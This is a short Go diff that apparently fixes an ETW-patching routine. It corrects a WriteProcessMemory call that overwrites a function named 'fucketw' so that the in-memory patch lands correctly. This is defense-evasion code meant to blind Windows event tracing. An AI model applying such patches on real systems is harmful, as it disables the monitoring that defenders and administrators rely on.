@@ -36,7 +36,7 @@ func main(){
 		return
 	}
 
-	WriteProcessMemory.Call(hProcess, fucketw.Addr(), uintptr(unsafe.Pointer(&patch)), uintptr(len(patch)),0)
+	WriteProcessMemory.Call(hProcess, fucketw.Addr(), uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)),0)
 
 
 
